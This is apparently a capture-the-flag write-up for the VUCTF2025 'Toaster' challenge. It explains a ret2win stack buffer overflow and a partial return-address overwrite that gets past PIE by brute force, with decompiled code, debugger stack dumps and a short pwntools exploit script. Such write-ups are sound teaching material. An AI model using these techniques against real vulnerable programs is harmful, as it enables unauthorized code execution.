# VUCTF2025 Toaster
This pwn challenge is a classic ret2win challenge. 

The main function contains calls to `menu()`, which simply prints some text, and to a vulnerable function `kitchen()`.
```
void main(void) {
  menu();
  kitchen();
  return;
}
```
The `kitchen()` function contains a 32 byte buffer, but reads up to 0x42 bytes to it, allowing for a buffer overflow:
```
void kitchen(void) {
  undefined1 local_28 [32];
  
  puts("Please give me your secret recipe? ");
  read(0,local_28,0x42);
  return;
}
```
The binary also contains a `toast()` function, which reads and prints the flag when reached:
```
void toast(void) {
  ...
  
  puts("You managed to make the perfect toast, please enjoy it!");
  iVar1 = setuid(0);
  if (iVar1 == 0) {
    local_c = open("/flag.txt",0);
    if (local_c < 0) {
      perror("open failed");
    }
    else {
      ...
      sVar2 = read(local_c,&local_78,99);
      local_10 = (int)sVar2;
      if (local_10 < 1) {
        perror("read failed");
      }
      else {
        write(1,"FLAG: ",6);
        write(1,&local_78,(long)local_10);
        close(local_c);
      }
    }
  }
  else {
    perror("setuid failed");
  }
  return;
}
```
The challenge is thus clear, we have to overflow the buffer in `kitchen()` to overwrite the return pointer on the stack and return into `toast()`.
However, it is made a bit more difficult by the enabled protections:
```
$ checksec toaster 
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```
The main issue is that PIE is enabled, causing the binary to be loaded at a randomized address. This means we won't know the address of `toast()` to return to. 
However, the offsets of functions inside the binary will still be equal. When inspecting the binary we can see that the address of the `toast()` function (`0x0010127d`) is close to the address of `main()` (`0x001013f7`), which the return address of `kitchen()` points to.
This offers an attack vector that can circumvent ASLR. We can try to overwrite only the last byte(s) of the address, leaving the randomised part of the address intact. 
This is possible as the addresses are stored in little endian, meaning the final characters of the address are stored first in memory.

To get a better view of what the randomised address will look like, we can inspect some example loaded addresses of the functions:
```
pwndbg> x toast
0x564a64fd527d <toast>: 0xfa1e0ff3
pwndbg> x main
0x564a64fd53f7 <main>:  0xfa1e0ff3
```
When comparing this to another run, we can see that the final three characters are always the same, but all the characters before those are random:
```
pwndbg> x toast
0x55d0d5d7127d <toast>: 0xfa1e0ff3
pwndbg> x main
0x55d0d5d713f7 <main>:  0xfa1e0ff3
```
We thus have to overwrite the final three characters of the return pointer with `27d` to return to `toast()`. The problem is that we can only write bytes, and a single byte corresponds to two address characters.
We can thus either overwrite 2 or 4 characters, but not three. 
Luckily, this is where the randomness of the addresses can actually help us. We know the address has to end in `x27d`, where `x` is random every time.
However, we can simply choose any character for `x`, and run our attack multiple times until the randomised address loaded equals `x`. which will happen once every 16 runs on average as addresses are hexidecimal.
We can do this using the following pwntools script:
```
io = start()
toast_addr = 0x10127d
payload = b"A" * 0x28
payload += p64(toast_addr)
payload = payload[:0x2a]
io.sendafter(b"Please give me your secret recipe? \n", payload)
io.interactive()
```
This scripts sends 28 bytes of padding to reach the return address. This offset can be found by setting a breakpoint in `kitchen()` before the read, and inspecting the stack using pwndebug.
The result of this can be found below, where the stack shows the offset `0x28` contains the return pointer back to `main()`.

```
───────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────
   0x563038ee73c8 <kitchen+5>     mov    rbp, rsp               RBP => 0x7ffccb089760 —▸ 0x7ffccb089770 ◂— 1
   0x563038ee73cb <kitchen+8>     sub    rsp, 0x20              RSP => 0x7ffccb089740 (0x7ffccb089760 - 0x20)
   0x563038ee73cf <kitchen+12>    lea    rax, [rip + 0xdda]     RAX => 0x563038ee81b0 ◂— 'Please give me your secret recipe? '
   0x563038ee73d6 <kitchen+19>    mov    rdi, rax               RDI => 0x563038ee81b0 ◂— 'Please give me your secret recipe? '
   0x563038ee73d9 <kitchen+22>    call   puts@plt                    <puts@plt>
 
 ► 0x563038ee73de <kitchen+27>    lea    rax, [rbp - 0x20]      RAX => 0x7ffccb089740 ◂— 0
   0x563038ee73e2 <kitchen+31>    mov    edx, 0x42              EDX => 0x42
   0x563038ee73e7 <kitchen+36>    mov    rsi, rax               RSI => 0x7ffccb089740 ◂— 0
   0x563038ee73ea <kitchen+39>    mov    edi, 0                 EDI => 0
   0x563038ee73ef <kitchen+44>    call   read@plt                    <read@plt>
 
   0x563038ee73f4 <kitchen+49>    nop    
─────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffccb089740 ◂— 0
01:0008│-018 0x7ffccb089748 —▸ 0x7ffccb089898 —▸ 0x7ffccb08b222 ◂— 'COLORFGBG=15;0'
02:0010│-010 0x7ffccb089750 —▸ 0x7fe642423000 (_rtld_global) —▸ 0x7fe642424310 —▸ 0x563038ee6000 ◂— 0x10102464c457f
03:0018│-008 0x7ffccb089758 —▸ 0x563038ee727a (menu+113) ◂— nop 
04:0020│ rbp 0x7ffccb089760 —▸ 0x7ffccb089770 ◂— 1
05:0028│+008 0x7ffccb089768 —▸ 0x563038ee7413 (main+28) ◂— nop 
06:0030│+010 0x7ffccb089770 ◂— 1
07:0038│+018 0x7ffccb089778 —▸ 0x7fe642200ca8 (__libc_start_call_main+120) ◂— mov edi, eax

```
This offset is then followed by the last 2 bytes of the address of `toast()` (`0x127d`).


## `sendafter()` vs `sendlineafter()`
When I first attempted the challenge, I was having issues where I was not just overwriting the return pointer with `0x0x127d`, but with `0x0a127d`. 
Debugging this cost me quite some time, but it ended up being caused by the fact that my exploit script at this point used `sendlineafter()` instead of `sendafter()`.
`sendlineafter()` also sends a newline character, which ended up becoming `0a` in the return address. Swapping out this function with `sendafter()` solved this problem.
